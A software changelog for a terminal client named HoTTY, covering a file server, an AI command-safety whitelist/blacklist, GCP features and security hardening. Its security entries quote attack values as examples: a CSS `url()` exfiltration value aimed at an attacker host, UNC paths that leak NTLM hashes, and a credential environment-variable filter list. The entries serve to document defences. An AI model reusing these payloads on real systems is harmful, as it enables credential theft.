# Release Notes

## v2.0.7-beta4

A fix for the File Server added in beta3: it now stops when you close its tab.

### Bug Fixes

- **The File Server now stops when its tab is closed.** Previously, closing a File Server tab left the TFTP and SFTP servers running in the background with their ports still bound (so a later restart on the same port could fail). The servers now shut down and release their ports as soon as the tab is closed — the File Server runs only while its tab is open.

## v2.0.7-beta3

A built-in **File Server** for pushing firmware and config images to network gear over the LAN — start a TFTP and/or SFTP server pointed at a folder you choose, and a Cisco-style device can `copy tftp:` / `copy scp:` straight from your machine.

### New Features

- **Built-in File Server (TFTP + SFTP) for firmware uploads.** A new **File Server** pane (tab bar → Features → "File Server") runs an in-app **TFTP** server (UDP, default port 69 — the classic Cisco IOS `copy tftp: flash:` method) and an **SFTP** server (SSH-based, default port 2222, username/password authentication) over a folder you select, so routers, switches and other LAN devices can download or upload firmware/config images directly. Serving is read-only by default (toggle **Allow uploads** per protocol for device→PC transfers); every request is confined to the chosen folder (path traversal, symlink escapes and sensitive system-path access are blocked); the SFTP host key is generated automatically and stored encrypted; and a live transfer log shows each client, file and direction. If **Windows Firewall** is blocking inbound connections, the pane says so and offers a one-click **Allow through firewall** (requires administrator). The feature can be turned off in **Settings → Features**.

## v2.0.7-beta2

HoTTY's interface is now multilingual. A new **Display language** selector in **Settings → General** switches the entire UI between eight languages, instantly and without a restart.

### New Features

- **The HoTTY interface is now available in 8 languages.** A new **Display language** selector in **Settings → General** switches the entire UI — menus, tabs, dialogs, settings, the AI chat panel, and in-app help — between **English, 日本語 (Japanese), 简体中文 (Simplified Chinese), 繁體中文 (Traditional Chinese), 한국어 (Korean), Русский (Russian), Español (Spanish), and Français (French)**. The change applies instantly with no restart, and your choice is remembered across launches. English remains the default, so existing installs are unaffected until you choose another language. (The AI's response language is configured separately in the AI chat panel and is unchanged by this setting.)

## v2.0.7-beta1

A security-focused beta that hardens HoTTY's dependency supply chain against the recent wave of compromised-package attacks. There are no changes to in-app behavior — this release strengthens the integrity of the build and dependency pipeline that produces the installer.

### Security

- **Dependency supply-chain hardening.** Builds now install strictly from verified lockfiles with cryptographic integrity checking, the public package registries are pinned (guarding against dependency-confusion swaps), and dependency updates are held for a multi-day cooldown before adoption — so a maliciously published version is not pulled in before it is detected and removed. Every release, and every push via CI, is now gated on npm registry-signature verification (`npm audit signatures`) plus a `cargo-deny` audit covering security advisories, crate sources, and licenses.

## v2.0.6

The v2.0.6 stable release, consolidating the v2.0.6 beta series. The headline is a new AI Chat command-safety model: auto-execution of AI-suggested commands is now gated by an explicit, fully user-managed **Whitelist / Blacklist + AI** classifier, and every command shows how it was judged. It also makes a leading `sleep` in an AI command wait client-side instead of on the device, and extends command-safety classification to Claude models on Vertex AI.

### New Features

- **Command safety is decided by a Whitelist, a Blacklist, and the AI — all configurable.** When Auto-execute is on, each AI-suggested command runs through three layers: the **Blacklist** is checked first (a match never auto-runs — a manual Run is still offered), the **Whitelist** auto-runs obvious read-only commands, and anything in between is sent to the AI, which judges whether the command changes configuration/state — only commands it judges read-only with enough confidence auto-run; everything else waits for confirmation. Both lists are fully editable in **Settings → AI → Command Execution**: a single word matches a base command (e.g. `docker` matches any docker command), and an entry with spaces matches as a substring (e.g. `rm -rf`, `git push`); each list has a **Reset to defaults** button. You can pick the strategy (Static / AI / **Hybrid**, the default) and the AI confidence threshold there too. This replaces the previous fixed safe-command list.
- **Every command shows how it was judged.** Each execute block now displays a per-command verdict — Whitelisted, AI verdict (with confidence), Blacklisted, or "needs confirmation" — with the reason, so an auto-run (or a withheld one) is never a mystery.
- **A leading `sleep` in an AI command now waits client-side instead of on the device.** When the AI issues a command that begins with `sleep N` (e.g. `sleep 120 && validate`), HoTTY now waits those N seconds locally and runs any chained command afterward, rather than sending the `sleep` to the terminal. Because a `sleep` on the device produces no output, the per-command **device-response idle timeout** would otherwise mis-fire during the wait and the AI would proceed prematurely; running the wait in HoTTY keeps the timing honest. The execute block shows a live **"⏳ Waiting Ns…"** countdown while the delay runs. Two new options live in **Settings → AI**: a toggle (on by default) and a **maximum delay** cap (default 900 s / 15 min — longer sleeps are clamped and noted; 0 = no cap).

### Improvements

- **Existing installs are migrated to the Hybrid classifier.** On upgrade, your previous custom safe commands are folded into the editable Whitelist, the Blacklist is seeded with sensible destructive-command defaults, and the strategy is set to Hybrid so AI judgment is available out of the box. You can change any of this in Settings.
- **Command-safety classification now works with Claude models on Vertex AI.** When the Hybrid / AI classifier sends a command to the model for an auto-execute verdict, Anthropic (Claude) models hosted on Vertex AI are now supported — previously only Google (Gemini) Vertex models could classify, and selecting a Claude-on-Vertex model made the classifier fall back to manual execution. Auto-execute-safe now behaves the same regardless of which Vertex model family you use.

## v2.0.6-beta2

A follow-up to beta1 that fixes how AI-issued `sleep` commands interact with the device-response timeout, and extends command-safety classification to Claude models on Vertex AI.

### New Features

- **A leading `sleep` in an AI command now waits client-side instead of on the device.** When the AI issues a command that begins with `sleep N` (e.g. `sleep 120 && validate`), HoTTY now waits those N seconds locally and runs any chained command afterward, rather than sending the `sleep` to the terminal. Because a `sleep` on the device produces no output, the per-command **device-response idle timeout** would otherwise mis-fire during the wait and the AI would proceed prematurely; running the wait in HoTTY keeps the timing honest. The execute block shows a live **"⏳ Waiting Ns…"** countdown while the delay runs. Two new options live in **Settings → AI**: a toggle (on by default) and a **maximum delay** cap (default 900 s / 15 min — longer sleeps are clamped and noted; 0 = no cap).

### Improvements

- **Command-safety classification now works with Claude models on Vertex AI.** When the Hybrid / AI classifier sends a command to the model for an auto-execute verdict, Anthropic (Claude) models hosted on Vertex AI are now supported — previously only Google (Gemini) Vertex models could classify, and selecting a Claude-on-Vertex model made the classifier fall back to manual execution. Auto-execute-safe now behaves the same regardless of which Vertex model family you use.

## v2.0.6-beta1

An AI Chat safety release: auto-execution of AI-suggested commands is now decided by an explicit, fully user-managed **Whitelist / Blacklist + AI** model, and every command shows how it was judged.

### New Features

- **Command safety is decided by a Whitelist, a Blacklist, and the AI — all configurable.** When Auto-execute is on, each AI-suggested command runs through three layers: the **Blacklist** is checked first (a match never auto-runs — a manual Run is still offered), the **Whitelist** auto-runs obvious read-only commands, and anything in between is sent to the AI, which judges whether the command changes configuration/state — only commands it judges read-only with enough confidence auto-run; everything else waits for confirmation. Both lists are fully editable in **Settings → AI → Command Execution**: a single word matches a base command (e.g. `docker` matches any docker command), and an entry with spaces matches as a substring (e.g. `rm -rf`, `git push`); each list has a **Reset to defaults** button. You can pick the strategy (Static / AI / **Hybrid**, the default) and the AI confidence threshold there too. This replaces the previous fixed safe-command list.
- **Every command shows how it was judged.** Each execute block now displays a per-command verdict — Whitelisted, AI verdict (with confidence), Blacklisted, or "needs confirmation" — with the reason, so an auto-run (or a withheld one) is never a mystery.

### Improvements

- **Existing installs are migrated to the Hybrid classifier.** On upgrade, your previous custom safe commands are folded into the editable Whitelist, the Blacklist is seeded with sensible destructive-command defaults, and the strategy is set to Hybrid so AI judgment is available out of the box. You can change any of this in Settings.

## v2.0.5

A small quality-of-life release: you can now move keyboard focus between panes without reaching for the mouse.

### New Features

- **Switch focus between panes from the keyboard.** `Ctrl+Tab` moves focus to the next pane and `Ctrl+Shift+Tab` to the previous one, cycling through every visible pane — grid cells first (in row-major order), then any visible sidebar panes. Previously the active pane could only be changed by clicking it. Because `Ctrl+Tab` cannot be encoded into the terminal byte stream, the shortcut never steals a keybinding from the shell, vim, tmux, or anything else running inside the pane.

## v2.0.4

A focused AI Chat release: the **Network Expert** persona now preps the device on its own. When such a chat is linked to a live terminal, HoTTY runs the persona's mandatory start-of-session protocol (identify the device, then disable paging) automatically — you no longer have to send a throwaway first message to get the session ready.

### New Features

- **Network Expert chats run their start-of-session protocol automatically.** When an AI Chat using the Network Expert persona is linked to a live terminal, HoTTY now kicks off the persona's mandatory prep — identify the device, then disable paging — on its own, so the response loop is ready before you ask anything (previously the protocol only ran once you sent a first message). The behavior is reconnect- and device-aware: switching the linked terminal to a *different* device first starts a fresh chat — clearing the old conversation and its backend history so the previous device's output can't bleed into the new context — and then re-runs the full prep, while a *reconnect to the same device* mid-conversation injects only a lightweight paging re-disable and keeps your conversation intact. A chat you have already typed into on a device HoTTY never managed is never hijacked.

## v2.0.3

The v2.0.3 stable release, consolidating the v2.0.3 beta series. Beyond the beta changes it adds **automatic re-linking of AI Chat tabs to a reconnected terminal**, clearer in-UI handling when a watched terminal has dropped, and a round of AI Chat streaming / auto-execute reliability fixes.

### New Features

- **AI Chat tabs re-link automatically to a reconnected terminal.** When a watched terminal disconnects, its AI Chat tab keeps a config-derived identity of the target (protocol + destination), and as soon as a terminal reconnects to that same target — a reconnect mints a brand-new session id — the orphaned tab re-links to it on its own, so the conversation keeps working without pressing **Watch** again. Re-linking happens only on an unambiguous match (exactly one reconnected session and one orphaned tab share the target identity); ambiguous same-target situations are left for you to resolve manually.

### Improvements

- **AI Chat shows when its linked terminal isn't connected.** The linked-terminal chip and each message's **Target:** label now turn amber and read "(disconnected)" while the watched session is dropped, reconnecting, or gone, with a tooltip explaining to reconnect the terminal and press **Watch** to re-link. Previously the link always looked healthy even when commands couldn't reach the terminal.
- **Pressing Watch after a reconnect relinks the current tab in place.** If the active tab still points at a dead session, toggling **Watch** on the reconnected terminal now relinks that tab (dropping the stale watch buffer) instead of opening a second tab still aimed at the dead session.
- **A dead or half-open SSH peer is now detected deterministically.** SSH keepalives are bounded by an explicit unanswered-probe limit, so a silently dropped or zombie connection surfaces as *disconnected* within a bounded window after it goes quiet instead of hanging — which is also what lets the UI and the AI Chat auto-rebind react to the drop.
- **`screen-length` is recognised as a read-only command** in Auto-execute-safe mode, so a paging-control line like `screen-length 0 temporary` on Huawei / H3C devices runs without manual confirmation.

### Bug Fixes

- **Running a command into a disconnected linked terminal no longer silently fails.** After an SSH drop and reconnect where the chat still looked linked, clicking **Run in Terminal** (or an auto-execute) sent the command to a session the backend no longer had and the error was swallowed — nothing ran and the AI waited indefinitely. The send is now guarded on both sides: a stale link suppresses auto-execute (leaving a manual **Run** button), and any attempt posts a clear "the linked terminal is not connected — reconnect and press Watch" result that the model can read.

- **AI Chat code blocks no longer overlap while a response streams.** A CSS rule forced every `<pre>` inside a streaming message to render inline, collapsing multi-line code blocks into overlapping text until the response finished (they self-corrected only once committed). Code blocks now stay block-level throughout streaming.
- **The execute-command block no longer garbles mid-stream.** While a response was still streaming, the ` ```execute ` block could render with corrupted, misaligned indentation: message parts were keyed by array position, so a given slot flipped between markdown (injected HTML) and execute (React children) content as more tokens arrived, leaving stale injected DOM. Parts now carry stable, kind-discriminated keys so React remounts cleanly on a flip, a trailing unclosed `execute` fence is recognised as a pending block mid-stream, and command lines no longer wrap.
- **AI Chat no longer hangs with the input locked after a stalled stream.** If a streamed response stalled after a chunk (a dropped completion signal or a hung provider), the 3-minute idle watchdog was being torn down and re-subscribed on every chunk — wiping the idle timer that chunk had just armed — so the timeout never fired and the chat stayed locked (only **Stop** recovered). The watchdog now subscribes once per pane, and a separate hard-cap timer cancels a stream that runs on endlessly without ever completing.
- **The AI per-command idle timeout now fires on a silent device.** A command whose device returned zero bytes (a dead or hung session, suppressed echo, or dropped connection) never tripped the "no response from device for N seconds" idle timeout and instead waited out the full 30-minute safety cap — exactly the silent-hang case the idle timeout exists for. The idle timeout no longer requires any output, so a silent device now times out promptly.
- **The first auto-executed command after a New chat is no longer suppressed.** Starting a **New chat** cleared the visible messages but kept the pane's auto-execute dedup guard and badge set. Because message indices restart at 0, the AI's first command in the new conversation regenerated the same key as the previous chat and was silently treated as a duplicate — it never reached the terminal and started no poll or idle timeout, yet a stale "Auto-executed" badge still showed. Both structures are now tracked per tab and reset when you start a New chat.

## v2.0.3-beta8

A GCP-pane release. Browsing your Compute Engine instances is now noticeably faster: discovery has been rebuilt on Google's REST APIs (Cloud Resource Manager + Compute `aggregatedList`) instead of spawning one `gcloud` subprocess per query — it fetches a single OAuth token per refresh and probes many projects concurrently, with an automatic fall back to the `gcloud` CLI if the REST path is unavailable. The pane also gains a **search box** to filter projects and instances as you type, and it now shows the **last-known list instantly on launch** while revalidating in the background. Two security hardening items round out the release: new host-tree (`.htree`) exports use the memory-hard **Argon2id** key-derivation function, and the `gcloud` argument guard now rejects the full set of shell metacharacters.

### New Features

- **Search box in the GCP pane.** A search field at the top of the GCP instances pane filters the list by project or instance name as you type. Matching is case-insensitive and spans both project names and instance names — a project stays visible if its own name matches or any of its instances do. A **×** button clears the query, and your last search text is remembered across sessions. The filter runs after the IAP-access gate, so it only ever surfaces instances you are allowed to connect to.

### Improvements

- **GCP projects and instances load instantly on launch.** The discovery snapshot (projects, instances, and IAP-access flags — no secrets) is now persisted to disk per user and reloaded on startup, so the pane shows your last-known list immediately instead of starting empty. If that snapshot is older than 10 minutes it is revalidated in the background (stale-while-revalidate), so you see data right away while it quietly refreshes. A fresh in-memory snapshot from a recent refresh is reused as-is and still requires an explicit **Refresh** to re-query.

### Performance

- **GCP discovery is substantially faster via Google's REST APIs.** Listing projects and instances and probing IAP / OS Login permissions previously spawned a separate `gcloud` (Python) subprocess for every call, which dominated refresh time for users with many projects. HoTTY now talks to the Cloud Resource Manager and Compute `aggregatedList` REST endpoints directly, fetching one OAuth access token per refresh (via `gcloud auth print-access-token`) and reusing it across every call, with the per-project work running at higher concurrency. Result ordering and the friendly error messages are identical to the old CLI path, and HoTTY automatically falls back to the `gcloud` CLI if the REST backend is unavailable.

### Security

- **New host-tree exports use Argon2id key derivation.** Encrypted `.htree` exports are portable, password-protected files, so their key-derivation strength directly governs offline brute-force resistance. New exports now derive their AES-256-GCM key with **Argon2id** (memory-hard: 64 MiB, 3 passes) instead of PBKDF2-HMAC-SHA256, and carry a format version so the scheme can evolve. Existing `.htree` files written by older builds still import unchanged — the previous PBKDF2 reader is retained solely for backward compatibility.
- **The `gcloud` argument guard now rejects all shell metacharacters.** The guard protecting the `gcloud.cmd` invocation (spawned via `cmd.exe`) previously rejected only the double-quote character. It now rejects the full BatBadBut set — `"`, `%`, `^`, `&`, `|`, `<`, `>`, and newlines — as defense-in-depth against argument / command injection through a `.cmd` batch file. Every GCP identifier reaching this path is already validated upstream, so this hardens a path with no known exploit. Follow-up to the argument-quoting guard added in beta4 and re-hardened in beta7.

## v2.0.3-beta7

A backend-and-frontend bug-fix release with two GCP IAP security follow-ups. The fixes span **connection reliability** (an SSH keepalive that never actually pinged, a Telnet socket leaked on disconnect, and GCP IAP key generation that failed for non-default OpenSSH installs), the **AI layer** (mid-stream / HTTP errors that corrupted chat history, Vertex AI failures mislabelled `API error 0`, and a Japanese-first-run language-selector bug), and several **credential / save-path correctness** issues (saved SSH key passphrases, edited passphrases served stale on reconnect, text-editor save ordering, and GCP instance action state). SSH disconnect is now immediate. The two security items extend the existing credential-environment scrubbing to the IAP tunnel's `gcloud` subprocess and harden the `gcloud` argument-quoting guard in release builds.

### Performance

- **SSH disconnect is now immediate.** Disconnecting an SSH session previously left the background reader task parked until a fixed drain timeout (~1.5 s) elapsed and it was force-aborted — the keepalive rework had removed the signal the reader used to wait on. The reader is now wired to a `CancellationToken` via `tokio::select!`, so `disconnect()` stops it at once and the teardown is race-free (the old `Notify`-based path had a lost-wakeup race). Closing or dropping an SSH tab no longer carries that tail latency.

### Bug Fixes

- **SSH keepalive now actually keeps idle sessions alive.** The keepalive task only ticked an internal timer and never sent anything on the wire, so idle SSH sessions were still dropped by the server even with a keepalive interval configured. HoTTY now uses russh's native `keepalive_interval`, which emits `keepalive@openssh.com` global requests — the same mechanism as OpenSSH's `ServerAliveInterval` — and the dead task was removed.
- **Telnet sessions no longer leak a socket on disconnect.** The Telnet disconnect path used a 200 ms timeout that logged "aborting" but never actually aborted the reader task, detaching it and leaking the underlying socket. It now matches the other protocols: wait up to 1500 ms, then `abort()` the handle.
- **AI provider errors no longer corrupt the chat history.** On a mid-stream failure or an HTTP error, HoTTY kept the unanswered user message and appended a partial/empty assistant turn (and emitted a duplicate "done"), corrupting the conversation for providers that require strict user/assistant alternation (Vertex AI, Anthropic) — the next message would then fail. All providers now share one policy: on a hard error the unanswered user message is dropped; on normal completion or cancellation the assistant turn is kept and closed cleanly.
- **Vertex AI errors now report the real HTTP status.** Vertex AI (and the Anthropic-on-Vertex path) reported every failure as `API error 0` because the response body was consumed before the status code was read. The status is now captured first, so the actual code appears in the error message.
- **AI chat response language fixed on Japanese first run.** The default response-language value `日本語` never matched the `Japanese` `<option>`, so the selector came up unselected on a Japanese first launch; and choosing `Auto` injected a literal "You MUST answer in Auto." line into the prompt. A shared `languageDirective()` helper now backs both the settings effect and the Ask-AI flow (English / Auto add no directive), the default is `Japanese`, and any stored `日本語` value is migrated.
- **Saved SSH key passphrases now work when connecting.** When dialing a saved host, the New Session dialog resolved the username and password from the decrypted credential cache but not the private-key passphrase, so an encrypted passphrase was handed to the backend verbatim and key authentication failed. All three credentials are now resolved together.
- **Editing a host's key passphrase is reflected on the next reconnect.** The decrypted-credential cache refreshed the username and password when you edited a saved host, but not the private-key passphrase, so a freshly-edited passphrase could be served stale on reconnect. The passphrase is now cached symmetrically with the other two credentials.
- **A failed text-editor save no longer mis-points the tab.** **Save** committed the tab's file path before the write completed, so if the write failed the tab was left pointing at a path that was never written. The path is now recorded only after the bytes land (matching **Save As**).
- **GCP instance actions no longer clobber each other's state.** Issuing overlapping start/stop actions on the same instance could let a superseded action's cleanup clear the successor's pending / live / error state. Tracker cleanup is now ownership-aware — only the current owner commits its snapshot and retracts state.
- **GCP IAP key generation no longer fails for non-default OpenSSH installs.** The `ssh-keygen.exe` lookup skipped the `PATH` scan on Windows (unlike the `ssh.exe` lookup), so an OpenSSH install outside the well-known location resolved `ssh.exe` but not `ssh-keygen.exe`, and key generation failed. Both now use the same `PATH`-aware executable finder.

### Security

- **GCP IAP tunnel: the `gcloud` subprocess no longer inherits credential-bearing environment variables.** The IAP-tunnel `gcloud` runner inherited the full, unscrubbed parent environment, while the other `gcloud` code path already cleared it and applied a sanitized allowlist. Both surfaces now share one policy (`env_clear()` + `sanitized_env()`), so the same credential carriers (API keys, tokens, `SSH_AUTH_SOCK`, session pointers, etc.) are filtered for every `gcloud` invocation. This extends the credential-environment scrubbing introduced in beta5 to the surface that had been missed.
- **GCP IAP: a `gcloud` command with a quote in its arguments is now rejected in all builds.** The guard against a `"` appearing in a `gcloud` argument vector previously only fired as a `debug_assert!` and then ran the mangled command anyway in release builds. It now hard-fails with an `InvalidConfig` error in every build profile. Follow-up to the argument-quoting guard added in beta4.

## v2.0.3-beta6

A host-tree-ergonomics release with two security follow-ups. The headline change closes a long-standing papercut: an **ad-hoc connection started from "New Connection" can now be saved to the host tree** without having to retype every field into the host-tree form. The save dialog presents the host-tree folders as a **selectable tree view** with **+ New Folder** built in, so you can pick a destination folder — or create one (nested if you like) — without leaving the dialog. A dedicated **🆕 New Connection** row at the top of the host tree replaces the previous "deselect the current host" step when you want to dial a fresh ad-hoc target. Two UNC-path security follow-ups (the ones missed in beta5's broader UNC sweep) round out the release.

### New Features

- **Save an ad-hoc session to the Host Tree from the tab.** Right-click any SSH or Telnet session tab and choose **Save to Host Tree…** to keep the connection for later. The save dialog shows your existing host-tree folders as a tree, with **(Root)** preselected at the top — click any folder to drop the new host there. The name field is pre-filled from the session's display name. SSH **private key path** and **passphrase** are persisted on the saved entry alongside username / password / jumpbox setup, so double-clicking the saved host later re-dials with the same auth setup. The right-click menu only appears for SSH and Telnet tabs (Serial / WSL / Local / GCP IAP are not target protocols for this flow).
- **Create folders directly inside the Save to Host Tree dialog.** The save dialog has a **+ New Folder** button below the folder tree. Click it, type a name, hit Enter, and a folder is created as a child of the currently-selected folder (or at the tree root if **(Root)** is selected). The new folder is highlighted and auto-becomes the destination, so you can save the host into it immediately. Repeat the flow to build a nested path (`Production / EU / DB` in three clicks) without ever leaving the dialog — previously you had to cancel out, switch to the host tree, build the folder there, and re-open the save flow.
- **🆕 New Connection row at the top of the Host Tree.** A dedicated row above the saved hosts starts a fresh ad-hoc connection — it clears the protocol form on the right of the **New Session** dialog so you can dial a one-off target without first deselecting a saved host. Clicking the row also clears the selection in the tree, so the form switches from "edit saved host" mode to "new connection" mode in one click. The previous workflow (open the dialog, then explicitly click an empty area of the tree to deselect) is gone.

### Improvements

- **Saved hosts appear in the dialog immediately, not after a restart.** Two unrelated `useHostManager()` callers (the Save to Host Tree dialog and the New Session host tree) each held their own copy of the tree state via independent `useState`. Saving a new host from the dialog wrote to `localStorage` and DPAPI-encrypted the entry, but the New Session dialog kept its stale in-memory copy and only refreshed when the whole app restarted. The hook now publishes tree updates through a small module-level subscriber, so every live `useHostManager()` instance receives the change synchronously and the new host is visible the next time the New Session dialog opens (or, if it's already open, immediately). The fix also covers the SSH private-key-passphrase field — it is now DPAPI-encrypted on disk alongside the password (`privateKeyPath` is left as plain text because it is a filesystem path, not a secret).

### Security

- **Vertex AI service-account key file path now rejects UNC / network paths.** A renderer-supplied `keyFilePath` like `\\attacker\share\key.json` would reach `Path::canonicalize()` before the approved-set check. On Windows, `canonicalize()` performs SMB resolution as a side effect — which means the auth flow leaks an NTLMv2 hash to the attacker-controlled UNC before the request is rejected. Both `validate_service_account_key` (the Tauri command path) and the `VertexAIProvider` auth-start path now reject `\\…` and `//…` prefixes up front, before any path resolution. Same defence as the SSH/Jumpbox UNC fix in beta5; this closes the Vertex AI side of the same class.
- **Local shell custom shell path now rejects UNC / network paths.** The **Local** session protocol lets users override the shell binary path via `shell_path` (a settings-time override, not a hot path). A UNC value like `\\attacker\share\evil.exe` would be handed to `portable_pty::CommandBuilder`, and the spawn would trigger SMB authentication against the attacker host before the binary was fetched — same NTLMv2 hash leak as the SSH key case. `LocalConfig::resolve_shell_path()` now refuses `\\…` / `//…` paths with `shell_path cannot be a UNC/network path`. Legitimate cases (local installations of cmd.exe / PowerShell / pwsh / Git Bash) are unaffected because the default resolution path looks up known binary locations, not user-typed paths.

## v2.0.3-beta5

A bug-fix-and-hardening release. The headline change fixes a long-standing **paste bug on Windows**: pasted multi-line text was producing an extra blank line between every row because the clipboard's CRLF was being forwarded to the remote shell unchanged. Three security hardening items round out the release — all defence-in-depth, none with a known active exploit — covering custom-theme JSON, SSH private-key paths, and the credential-environment filter applied to spawned `gcloud` / `wsl.exe` / local-shell child processes.

### Bug Fixes

- **Pasted text no longer gains a blank line between rows.** On Windows the system clipboard stores line breaks as CRLF (`\r\n`). When you confirmed a paste in HoTTY, the bytes were forwarded to the remote shell verbatim — the shell processed `\r` as Enter (executing the line) and then echoed the trailing `\n` as a literal newline, producing a visible blank row below each pasted line. The paste path now normalises `\r\n` and bare `\n` to a single `\r` before sending (matching xterm.js's own `prepareTextForTerminal()` behaviour), so a copied 10-line snippet pastes as 10 rows instead of 19. Standalone `\r` is left intact for environments that need it. The xterm.js built-in paste handler is intentionally suppressed so the Paste Confirmation modal can intercept first; this fix restores the normalisation step that the bypass removed.

### Security

- **Custom theme JSON values are now sanitised against CSS injection / external-resource exfiltration.** The `save_custom_theme` Tauri command previously validated only the length of theme-variable values (≤500 chars). A maliciously crafted theme JSON imported into `%APPDATA%/com.hotty.terminal/themes/` could set a variable value to, e.g., `url("https://attacker/x?leak=…")`; when the frontend later consumed that variable in a stylesheet rule (`background-image: var(--bg-primary)`), the browser would fetch the attacker URL and exfiltrate by request side-channel. The backend now rejects any theme value containing `url(`, `;`, `{`, `}`, `<`, `>`, or newline characters, and applies the same check to the four terminal colour values. The frontend `setProperty('--name', value)` path already discards structurally-malformed values, so the key side of the attack was never viable; this closes the value side.
- **SSH and Jumpbox private-key paths now reject UNC / network paths.** A renderer-supplied `private_key_path` like `\\attacker\share\probe` would cause `russh::keys::load_secret_key()` to issue an SMB read against the attacker-controlled UNC, which on Windows hands over an NTLMv2 hash that can be relayed elsewhere. Both `services::ssh::try_authenticate()` and `services::jumpbox::authenticate_jumpbox()` now refuse `\\…`, `//…`, and Win32 verbatim-UNC `\\?\UNC\…` paths before calling `load_secret_key`, returning `Private key path cannot be a UNC/network path` (or `Jumpbox: …` for the jumpbox hop) in the auth-failed toast. Legitimate UNC-stored keys can be copied to a local path; the security benefit on Windows outweighs the edge case.
- **Sensitive-environment filter for `gcloud` / `wsl.exe` / local shells now catches several more credential carriers.** The pattern list used to filter the parent process environment before inheriting it into spawned children (`gcloud`, `wsl.exe`, the local shell process) previously matched `API_KEY`, `SECRET`, `TOKEN`, `PASSWORD`, `PASSWD`, `CREDENTIAL`, `PRIVATE_KEY`, `ACCESS_KEY`. It now also matches `AUTH` (so `SSH_AUTH_SOCK` is filtered — important because inheriting it into `wsl.exe` gives the WSL user the host SSH agent), `SESSION` (so 1Password's `OP_SESSION_*` and similar session pointers are filtered), `PASSPHRASE`, and the explicit names `AWS_PROFILE` and `KUBECONFIG` (which are themselves pointers to credential files on disk). The three previously-duplicated copies of this filter across `gcloud_iap.rs`, `local.rs`, and `wsl.rs` are now backed by a single shared helper, so future additions only need to be made in one place.

## v2.0.3-beta4

A focused polish-and-fix release. The headline change rewrites the **SSH / Telnet / Jumpbox connection-failure messages** from raw library text (`connection failed: example.com:22: failed to lookup address information: ...`) into short, plain-English labels (`Host not found`, `Wrong passphrase for private key`, `Jumpbox: Connection refused`, …). The **GCP Instances pane** gains an IAM-aware filter that hides VMs you have no IAP tunnel permission for. A regression in the OS Login metadata probe — embedded `"` in the gcloud projection broke `cmd.exe`'s quoting and surfaced as `'C:\…\Google\Cloud' is not recognized` for some users on beta2 / beta3 — is fixed, and the same probe now also handles org-level OS Login enforcement correctly.

### New Features

- **GCP Instances pane: IAM-aware filter.** During Refresh, HoTTY now probes `iap.tunnelInstances.accessViaIAP` and `compute.instances.osLogin` at the project level (and, when project-level IAP is denied, also at the instance level) via `gcloud projects test-iam-permissions` / `gcloud compute instances test-iam-permissions`. VMs without IAP-tunnel permission are hidden by default, and a **🔒 counter button** in the pane header lets you toggle them back on. Instances without OS Login permission stay visible (SSH may still work via metadata SSH keys) but display a **🔑 warning glyph**. When the IAM probe itself fails (network blip, deleted project) the instance stays visible so accessible VMs are never hidden by accident. The "show hidden" toggle persists across launches via `localStorage`.

### Improvements

- **Plain-English SSH / Telnet / Jumpbox connection errors.** Connection-failure toasts now show short, human-friendly labels in place of the raw `russh` / `std::io::Error` text. Examples:

  | Before | After |
  | --- | --- |
  | `connection failed: example.com:22: failed to lookup address information: ...` | `Host not found` |
  | `connection failed: example.com:22: Connection refused (os error 10061)` | `Connection refused` |
  | `connection failed: example.com:22: timed out after 15s` | `Connection timed out (15s)` |
  | `connection failed: no common kex algorithms` | `No common kex algorithm with server` |
  | `authentication failed: all authentication methods failed` | `Authentication failed` |
  | `authentication failed: password: Disconnect ServiceNotAvailable` | `Password authentication failed` |
  | `authentication failed: load key failed: ... bad decrypt ...` | `Wrong passphrase for private key` |
  | `connection failed: ssh-over-jumpbox: timed out after 15s` | `Target connection timed out via jumpbox (15s)` |

  Failures on the jumpbox hop are tagged `Jumpbox: …` so you can tell which hop dropped the connection. The raw underlying error string is still written to the debug log file for diagnostics — only the toast text changes.
- **gcloud OS Login detection now respects org-level enforcement.** Previously, when neither the instance metadata nor the project metadata had `enable-oslogin=TRUE`, HoTTY would fall straight back to the local Windows username. That broke IAP connections in GCP organizations that enforce OS Login via the `constraints/compute.requireOsLogin` policy (typical for enterprise tenants), where the per-resource flag is never written. HoTTY now also probes the active account's POSIX profile in this case and uses the OS Login username when one exists, mirroring `gcloud compute ssh`'s own resolution order. Only when no POSIX profile is found does it fall back to the local username.
- **Shorter "Compute Engine API not enabled" message** (follow-up to beta3). The error that appears under a project row in the GCP Instances pane when the Compute Engine API is disabled has been further trimmed to just `Compute Engine API is not enabled.`. The previously-included `gcloud services enable compute.googleapis.com --project=…` command is dropped from the visible message; the full gcloud stderr (including that command) is still captured in the debug log if you want to copy / paste it.

### Bug Fixes

- **gcloud OS Login probe no longer fails with `'C:\…\Google\Cloud' is not recognized`.** The metadata describe call that beta2 added for OS Login detection used `--format=value("...filter("key:enable-oslogin")...")`, embedding `"` characters in the argument vector. Because `gcloud` ships on Windows as `gcloud.cmd` and Rust's standard library spawns `.cmd` files via `cmd.exe`, the cmd.exe "3-or-more `"` rule" stripped the outer quotes around the program path and gcloud failed before it ever ran. The probe now uses `--format=json(metadata.items)` (no embedded quotes) and parses the result with `serde_json`; a regression-guarded debug assertion in `run_gcloud_capture` rejects any future arg vector that contains `"` so the issue cannot return.

## v2.0.3-beta3

A small UI polish release. The headline change tidies up the **New Session** dialog so the **Hosts** and **GCP** tabs have matching widths and the Hosts tab clearly encloses both the host tree and the protocol form. A separate tweak shortens an over-long error string that appeared when GCP Discovery encountered projects without the Compute Engine API enabled.

### Improvements

- **New Session dialog: Hosts / GCP tabs now share a consistent layout.** Previously the **Hosts** tab visually shrank to 380 px (the tab bar sitting only above the host tree) while the **GCP** tab stretched to fill the modal — making the two tabs look like different widgets. The tab bar now spans the full modal width on both tabs, and on the **Hosts** tab the host tree, resize divider, and protocol form all live inside the tab body. The tab buttons themselves were also rebuilt as natural-width pills at the top-left of the strip (instead of two 50/50 half-width panes), so the protocol form on the right of the **Hosts** tab no longer reads as if it belonged to the **GCP** tab.
- **GCP Discovery: shorter "Compute Engine API not enabled" message.** The error that appears under a project row in the **GCP Instances** pane when the Compute Engine API is disabled (the typical case for `Default Gemini Project` / Vertex / AI-Studio-managed projects that never opted in to Compute Engine) was rewritten from two redundant sentences down to one. The duplicated project name and the "or enable it in the Cloud Console" alternative have been dropped; the remaining message keeps both the actionable `gcloud services enable compute.googleapis.com --project=…` command and the project ID, just less noisy in the pane.

## v2.0.3-beta2

